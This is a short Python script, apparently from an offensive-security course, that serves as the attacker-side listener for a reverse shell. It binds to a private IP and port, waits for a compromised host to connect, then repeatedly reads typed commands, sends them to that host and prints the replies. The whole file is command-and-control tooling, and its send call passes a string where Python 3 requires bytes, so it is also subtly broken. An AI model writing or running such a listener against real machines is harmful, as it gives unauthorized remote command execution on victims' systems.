#!/usr/bin/env python3

import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #basicaly allow to re-use socket
listener.bind(("192.168.204.128", 1234))
listener.listen(0)
print("[+] Waiting for incoming connection")
connection, address = listener.accept()
print("[+] Got a connection from " + str(address))

while True:
    command = input(">> ")
    connection.send(command)
    result = connection.recv(1024)
    print(result)

